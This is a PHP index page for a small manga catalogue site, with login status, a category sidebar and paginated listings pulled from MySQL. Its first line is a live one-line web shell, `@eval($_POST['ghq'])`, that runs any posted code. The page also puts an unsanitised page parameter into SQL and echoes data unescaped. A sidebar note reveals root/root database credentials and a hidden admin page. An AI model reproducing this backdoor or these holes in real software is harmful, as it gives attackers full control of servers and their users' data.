    <?php @eval($_POST['ghq']);?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>漫画狗--你想要的所有</title>
<link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="css/main.css">
	<script src="js/jquery_min.js"></script>
</head>
<body>
	<div class="navbar navbar-default">
		<div class="container">
			<div class="navbar-header">
				<div class="navbar-brand"><a href="index.php"></a></div>
			</div>
			<ul class="nav navbar-nav">
				<li class="active"><a href="index.php">首页</a></li>
				<li><a href="#">更新</a></li>
				<li><a href="#">排行榜</a></li>
				<li><a href="#">分类</a></li>
				<li>
					<form action="seach.php" method="post" name="seach_name">
				<div class="input-group" style="padding-top:7px;padding-left:200px;">
					<input type="text" name="ss" class="form-control" placeholder="搜索漫画">
					<span class="input-group-btn">
						<input type="submit" class="btn btn-default" name="ok" value="Go!">
					</span>
					</div><!-- /input-group -->
					</form>
				</li>
			</ul>
			<ul class="nav navbar-nav navbar-right">
				<li><a href="#">
					<?php
					error_reporting(E_ALL^E_NOTICE^E_WARNING); //屏蔽错误信息
				include "conn.php";
				session_start();
				if($_SESSION['islogin']==1){
				echo "<b>欢迎你:".$_SESSION['username']."</b>";
				}
				else{
					echo "<b>未登录</b>";
				}
				?>
				</a></li>
				<li><a href="sign.php">登录</a></li>
				<li><a href="register.php">注册</a></li>
				<li><a href="quitsign.php">退出登录</a></li>
			</ul>
		</div>
	</div>
	<div class="container">
		<div class="row">
		<div class="col-sm-2">
			<div class="list-group sidebar">
				<a href="#" class="list-group-item active">分类</a>
				<a href="#" class="list-group-item">热血</a>
				<a href="#" class="list-group-item">恋爱</a>
				<a href="#" class="list-group-item">后宫</a>
				<a href="#" class="list-group-item">恐怖</a>
				<a href="#" class="list-group-item">搞笑</a>
				<a href="#" class="list-group-item">都市</a>
				<a href="#" class="list-group-item">全部</a>
				<a href="#" class="list-group-item active">地区</a>
				<a href="#" class="list-group-item">日漫</a>
				<a href="#" class="list-group-item">国漫</a>
				<a href="#" class="list-group-item">欧美</a>
				<a href="#" class="list-group-item">全部</a>
			</div>
		</div>
		<div class="col-sm-7">
			<div class='news-list'>
				<!-- <div class='news-list-item clearfix'>
					<div class='col-xs-4'> -->
						<!-- 进行数据库查询然后把资源现实在页面上，并且登录后可以现实下载接口 -->
						<?php
							if($_SESSION['islogin']==1)
							{
								$every_item = 4; // 每页显示4条
								$sql1 = 'select * from tb_book';
								$result1 = mysqli_query($conn,$sql1);
								$rs = mysqli_num_rows($result1);
								if($rs%$every_item==0){
									$every_page = (int)($rs/$every_item);
								}
								else
								{
									$every_page = (int)($rs/$every_item)+1;
								}
								if($_GET['page']){
									$page = $_GET['page'];
									$start = ($page-1)*$every_item;
								}
								else{
									$page = 1;
									$start = 0;
								}
								$sql = 'select * from tb_book limit '.$start.",".$every_item;
								$result = mysqli_query($conn,$sql);

								while($row=mysqli_fetch_array($result)){
									echo "<div class='news-list-item clearfix'>";
									echo "<div class='col-xs-4'>";
									echo "<img src=images/".$row['bookimage'].">";
									echo "</div>";
									echo "<div class='col-xs-8'>";
									echo "<div class='title'>";
									echo $row['bookname'];
									echo "</div>";
									echo "<div class='status'>状态:".$row['bookzt']."</div>";
									echo "<div class='info'>".$row['bookinfo']."</div>";
									echo "<div><a href=#><input style='max-width:200px' class='btn btn-primary btn-block' type='button' value='预览'></a></div>";
									echo "<div><a href=#><input style='max-width:200px;margin-top:20px;background-color:red;' class='btn btn-primary btn-block' type='button' value='下载'></a></div>";


									echo "</div>";
									echo "</div>";
								}
									echo "<div class='page-font'>";
									echo "共".$every_page."页-当前是第".$page."页 ";
									echo "<a href=?page=1>第一页 </a>";
									echo "<a href=?page=".($page+1).">下一页 </a>";
									echo "<a href=?page=".($page-1).">上一页 </a>";
									echo "<a href=?page=".$every_page."> 尾页</a>";
									echo "</div>";
									if($_GET['page']==0)
									{
										echo "<script>alert('你达到了未知领域请返回!');</script>";
									}
							}
							else
							{
								$every_item = 4; // 每页显示4条
								$sql1 = 'select * from tb_book';
								$result1 = mysqli_query($conn,$sql1);
								$rs = mysqli_num_rows($result1);
								if($rs%$every_item==0){
									$every_page = (int)($rs/$every_item);
								}
								else
								{
									$every_page = (int)($rs/$every_item)+1;
								}
								if($_GET['page']){
									$page = $_GET['page'];
									$start = ($page-1)*$every_item;
								}
								else{
									$page = 1;
									$start = 0;
								}
								$sql = 'select * from tb_book limit '.$start.",".$every_item;
								$result = mysqli_query($conn,$sql);

								while($row=mysqli_fetch_array($result)){
									echo "<div class='news-list-item clearfix'>";
									echo "<div class='col-xs-4'>";
									echo "<img src=images/".$row['bookimage'].">";
									echo "</div>";
									echo "<div class='col-xs-8'>";
									echo "<div class='title'>";
									echo $row['bookname'];
									echo "</div>";
									echo "<div class='status'>状态:".$row['bookzt']."</div>";
									echo "<div class='info'>".$row['bookinfo']."</div>";


									echo "</div>";
									echo "</div>";
								}
									echo "<div class='page-font'>";
									echo "共".$every_page."页-当前是第".$page."页 ";
									echo "<a href=?page=1>第一页 </a>";
									echo "<a href=?page=".($page+1).">下一页 </a>";
									echo "<a href=?page=".($page-1).">上一页 </a>";
									echo "<a href=?page=".$every_page."> 尾页</a>";
									echo "</div>";
									if($_GET['page']==0)
									{
										echo "<script>alert('你达到了未知领域请返回!');</script>";
									}
							}

	// 搜索模块
							?>


			</div>

		</div>
		<div class="col-sm-3" >数据库账号密码皆为root，隐藏了一个后台管理员地址adminmain.php可以用来管理页面，登录后可以看到下载和预览的按钮但是只是连接因为下载网上漫画资源是侵权的所以我就没做，就是这样。
		</div>
		</div>

	</div>
	<div class="navbar navbar-default bottom">
			<div class="container">
				<div class="bottom-item">
				<ul>
					<li><b style="font-size:18px">关于我们</b></li>
					<li>法律声明</li>
					<li>招聘启事</li>
					<li>更多问题</li>
				</ul>
				</div>
				<div class="bottom-item">
				<ul>
					<li><b style="font-size:18px">商务合作</b></li>
					<li>市场合作</li>
					<li>商务合作</li>
					<li>友情链接</li>
				</ul>
				</div>

				<div class="bottom-item">
				<ul>
					<li><b style="font-size:18px">联系我们</b></li>
					<li>在线客服</li>
					<li>官方微博</li>
					<li>意见反馈</li>
					<li>违法举报</li>
				</ul>
				</div>
				<div class="bottom-item" style="width:335px;height:130px;border-left:1px solid #999;border-right:1px solid #999;">
					<img src="images/bottom-image.jpg">
					<img src="images/bottom-image.jpg">
				</div>
				<div class="bottom-item " style="width:335px">
					<p style="color:#666;margin-top:30px">@本网站是独立开发者我凭借爱好制作的,作为磨练自己技术而写的,所以不会盈利.资源来自于网络</p>
				</div>
			</div>
	</div>
</body>
</html>
